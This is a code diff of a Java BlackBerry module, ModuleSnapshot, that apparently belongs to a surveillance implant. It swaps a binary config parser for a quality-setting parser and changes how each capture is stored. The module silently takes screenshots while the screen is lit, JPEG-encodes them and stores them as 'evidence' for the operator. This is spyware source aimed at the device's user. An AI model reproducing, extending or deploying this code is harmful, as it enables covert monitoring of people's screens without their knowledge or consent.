@@ -9,15 +9,14 @@
  * *************************************************/
 package blackberry.module;
 
-import java.io.EOFException;
-
 import net.rim.device.api.system.Backlight;
 import net.rim.device.api.system.Bitmap;
 import net.rim.device.api.system.Display;
 import net.rim.device.api.system.EncodedImage;
 import net.rim.device.api.system.JPEGEncodedImage;
 import net.rim.device.api.util.DataBuffer;
-import blackberry.config.Conf;
+import blackberry.config.ConfModule;
+import blackberry.config.ConfigurationException;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
@@ -36,42 +35,48 @@ public final class ModuleSnapshot extends BaseModule implements UserAgent{
     static Debug debug = new Debug("SnapShotAgent", DebugLevel.INFORMATION);
     //#endif
 
-    private static final int SNAPSHOT_DEFAULT_JPEG_QUALITY = 70;
     private static final int LOG_SNAPSHOT_VERSION = 2009031201;
     private static final int MIN_TIMER = 1 * 1000;
     private static final long SNAPSHOT_DELAY = 1000;
 
-    private int timerMillis = 0;
-    private boolean onNewWindow = false;
+    /** The Constant CAPTURE_FULLSCREEN. */
+    final private static int CAPTURE_FULLSCREEN = 0;
 
-    /**
-     * Instantiates a new snap shot agent.
-     * 
-     * @param agentStatus
-     *            the agent status
-     */
-    public ModuleSnapshot(final boolean agentEnabled) {
-        super(BaseModule.AGENT_SNAPSHOT, agentEnabled, Conf.AGENT_SNAPSHOT_ON_SD,
-                "SnapShotAgent");
-        //#ifdef DBC
-        Check.asserts(
-                Evidence.convertTypeEvidence(agentId) == EvidenceType.SNAPSHOT,
-                "Wrong Conversion");
-        //#endif
-    }
+    /** The Constant CAPTURE_FOREGROUND. */
+    final private static int CAPTURE_FOREGROUND = 1;
 
-    /**
-     * Instantiates a new snap shot agent.
-     * 
-     * @param agentStatus
-     *            the agent status
-     * @param confParams
-     *            the conf params
+    /** The delay. */
+    private int delay;
+
+    /** The type. */
+    private int type;
+    private int quality;
+
+    /*
+     * (non-Javadoc)
+     * @see blackberry.agent.Agent#parse(byte[])
      */
-    protected ModuleSnapshot(final boolean agentStatus, final byte[] confParams) {
-        this(agentStatus);
-        parse(confParams);
+    public boolean parse(ConfModule conf) {       
+        try {
+            String qualityParam = conf.getString("quality");
+            if("low".equals(qualityParam)){
+                quality=50;
+            }else if("med".equals(qualityParam)){
+                quality=70;
+            }else if("high".equals(qualityParam)){
+                quality=90;
+            }
+        } catch (ConfigurationException e) {
+            //#ifdef DEBUG
+            debug.error(e);
+            debug.error("parse");
+            //#endif
+        }
+
+        
+        return true;
     }
+    
 
     // se e' in standby non prendi la snapshot
     /*
@@ -79,40 +84,37 @@ public final class ModuleSnapshot extends BaseModule implements UserAgent{
      * @see blackberry.threadpool.TimerJob#actualRun()
      */
     public void actualGo() {
-
+    
         //#ifdef DEBUG
         debug.trace("snapshot");
         //#endif
-
+    
         if (!Backlight.isEnabled()) {
             //#ifdef DEBUG
             debug.trace("No backlight, skipping snapshot");
             //#endif
             return;
         }
-
+    
         final Bitmap bitmap = getScreenshot();
-
+    
         //#ifdef DEBUG
         debug.info("Taking screenshot");
         //#endif
-
+    
         // EncodedImage encoded = PNGEncodedImage.encode(bitmap);
         final EncodedImage encoded = JPEGEncodedImage.encode(bitmap,
-                SNAPSHOT_DEFAULT_JPEG_QUALITY);
-
+                quality);
+    
         final byte[] plain = encoded.getData();
-
-        //#ifdef DBC
-        Check.requires(evidence != null, "Null log");
-        //#endif
-        
+    
+        Evidence evidence = new Evidence(EvidenceType.SNAPSHOT);
         evidence.atomicWriteOnce(getAdditionalData(),plain);
-
+    
         //#ifdef DEBUG
         debug.trace("finished run");
         //#endif
-
+    
     }
 
     /**
@@ -167,49 +169,6 @@ public final class ModuleSnapshot extends BaseModule implements UserAgent{
         //#endif
 
         return additionalData;
-    }
-
-    /*
-     * (non-Javadoc)
-     * @see blackberry.agent.Agent#parse(byte[])
-     */
-    protected boolean parse(final byte[] confParameters) {
-        //#ifdef DBC
-        Check.asserts(confParameters != null, "Null confParameters");
-        //#endif
-
-        final DataBuffer databuffer = new DataBuffer(confParameters, 0,
-                confParameters.length, false);
-
-        try {
-            int value = databuffer.readInt();
-
-            if (value >= MIN_TIMER) {
-                timerMillis = value;
-            }
-
-            value = databuffer.readInt();
-            onNewWindow = (value == 1);
-            //#ifdef DEBUG
-            debug.trace("onNewWindow: " + onNewWindow);
-            //#endif
-
-        } catch (final EOFException e) {
-            //#ifdef DEBUG
-            debug.error("params FAILED");
-            //#endif
-            return false;
-        }
-
-        setPeriod(timerMillis);
-        setDelay(SNAPSHOT_DELAY);
-
-        //#ifdef DEBUG
-        debug.info("timer: " + timerMillis + " ms");
-
-        //#endif
-
-        return true;
     }
 
 }
